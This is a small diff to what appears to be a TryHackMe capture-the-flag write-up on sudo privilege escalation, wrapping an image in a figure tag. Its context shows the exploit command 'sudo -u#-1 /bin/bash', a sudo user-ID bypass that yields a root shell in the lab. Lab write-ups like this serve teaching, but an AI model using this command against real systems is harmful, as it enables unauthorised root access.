@@ -47,7 +47,9 @@ User tryhackme may run the following commands on sudo-privesc:
 ### What is the flag in /root/root.txt?
 We can find the exploit on the following page.
 
+<figure style={{ textAlign: 'center' }}>
 ![1](https://github.com/Knign/Write-ups/assets/110326359/b3e3ece3-ea74-42c3-aefa-800116a4748f)
+</figure>
 
 ```
 tryhackme@sudo-privesc:~$ sudo -u#-1 /bin/bash
